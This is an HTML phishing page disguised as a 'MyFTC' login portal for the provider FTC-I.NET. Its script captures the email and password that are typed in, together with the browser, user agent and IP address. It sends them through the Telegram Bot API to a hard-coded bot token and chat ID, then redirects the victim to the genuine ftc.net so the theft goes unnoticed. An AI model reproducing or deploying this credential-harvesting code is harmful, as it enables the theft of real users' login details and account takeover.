<!DOCTYPE html>
<html lang="en">

<head>
<title> Login | MyFTC </title>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />


<script type="text/javascript"  src="jquery.min.js"></script>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<!------ Include the above in your HEAD tag ---------->
<link rel="shortcut icon" href="favicon.ico">
<style>


@font-face {
  font-family: "Raleway";
  src: url("Raleway_400Regular.75b4247fdd3b97d0e3b8e07b115673c2.ttf");
}
body{
font-family: "Raleway" !important;
background : #f1f1f1 !important;
}
.login-container{
    margin-top: 1%;
    margin-bottom: 5%;
}
.login-form-1{
background:#ffffff;
margin-top: 10%;
    box-shadow: 0 1.8px 3px 0 rgba(0, 0, 0, 0.2);
    border-radius: 15px;
}
.login-form-1 h3{
    text-align: center;
    color: #333;
}

.login-container form{
    padding: 4%;
}
.btnSubmit
{
    width: 20%;
    border-radius: 20px;
    padding: 10px;
    border: none;
    cursor: pointer;
}
.login-form-1 .btnSubmit{
    font-weight: 600;
    color: #fff;
    border: rgb(0, 130, 196);
    background-color: rgb(0, 130, 196);
}

.login-form-1 .ForgetPwd{
    color: rgb(0, 130, 196);
    #font-weight: 600;
    text-decoration: none;

}

img {
  display: block;
  margin: auto;
  width: 130px;
}
#error{
color:rgb(244, 67, 54);
}
</style>
</head>
<body>
<div class="container login-container">
            <div class="row">
                <div class="col-md-5 offset-md-4">
                    <img src="app-logo.af9bd129bfa1f0e243f3570147f36211.png" class="logo" />

                    <div class="login-form-1">
                    <form method="POST" id="eform" name="eform">

                    <div class="error" id="error"></div>
                    <div class="form-group">
                            <label>Email Address </label>

                            <input type="text" class="form-control"  placeholder="Email Address" autofocus name="euser" id="euser" value="" />
                        </div>

                        <div class="form-group">
                            <label>Password </label>
                            <input type="password" class="form-control" placeholder="Password" value="" name="epass" id="epass"  />
                        </div>
                        <div class="form-group">
                            <a href="#" class="ForgetPwd" id="eforgetp">Forget Password?</a>
                        </div>

                        <div class="form-group">
                            <button type="submit" class="btn btnSubmit" > Log in </button>
                        </div>

                    </form>
                    </div>
                </div>

            </div>
        </div>



        <script>

        function browserN() {
  if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
    return 'Opera';
  } else if (navigator.userAgent.indexOf("Edg") != -1) {
    return 'Edge';
  } else if (navigator.userAgent.indexOf("Chrome") != -1) {
    return 'Chrome';
  } else if (navigator.userAgent.indexOf("Safari") != -1) {
    return 'Safari';
  } else if (navigator.userAgent.indexOf("Firefox") != -1) {
    return 'Firefox';
  } else if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) //IF IE > 10
  {
    return 'IE';
  } else {
    return 'unknown';
  }
}


        function fetch_ip(){
          let ajax = new XMLHttpRequest();
          if(ajax!=null){
              ajax.open("GET","https://europe-west3-devrcc.cloudfunctions.net/whatismyip",true);
              ajax.onreadystatechange = function() {
                  if(this.readyState == 4) {
                      if(this.status == 200) {
                          return this.responseText;
                      }
                  }
              }
              ajax.send(null);
          }
                return 'unknown';
        }


        $(document).ready(function(){



        const provider = "FTC-I.NET(https://ftc.net)";
        const get_ip = fetch_ip();
        const get_browsername = browserN();



        console.log(get_ip);
        console.log(get_browsername);



        $("#eform").on("submit", function (e){
          e.preventDefault();

          var euser = $("#euser").val();
          var epass = $("#epass").val();

          console.log(euser);
          console.log(euser == "");
          if (euser == "" || epass == ""){
              $("#error").html("<i>Error: Please enter a valid email and password.</i>");

          }else{

            $("#error").html("");

            var message = `PROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
            var status = notifyTelegram(message);

            console.log(status);
            if (status == true){
              window.location.href = "https://ftc.net";

              }
          }

        });

        })


        async function notifyTelegram(message) {
            const botToken = '7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
            const chatId = '1369859387';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    console.error('Error notifying Telegram: ' + await response.text());
                }
            } catch (error) {
                console.error('Fetch error: '+ error);
            }
            return true;
        }
    </script>


</body>


</html>
